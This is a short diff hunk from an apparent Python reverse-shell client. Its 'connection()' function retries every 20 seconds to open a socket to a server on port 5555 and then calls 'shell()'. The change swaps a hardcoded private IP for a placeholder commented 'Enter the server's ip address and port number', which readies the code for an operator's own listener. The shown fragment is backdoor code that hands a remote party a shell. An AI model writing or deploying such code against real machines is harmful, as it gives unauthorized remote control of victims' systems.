@@ -21,7 +21,7 @@ def connection():
 	while True:
 		time.sleep(20)
 		try:
-			sock1.connect(('192.168.0.110', 5555))
+			sock1.connect(('0.0.0.0', 5555)) ## Enter the server's ip address and port number.
 			shell()
 			sock1.close()
 			break
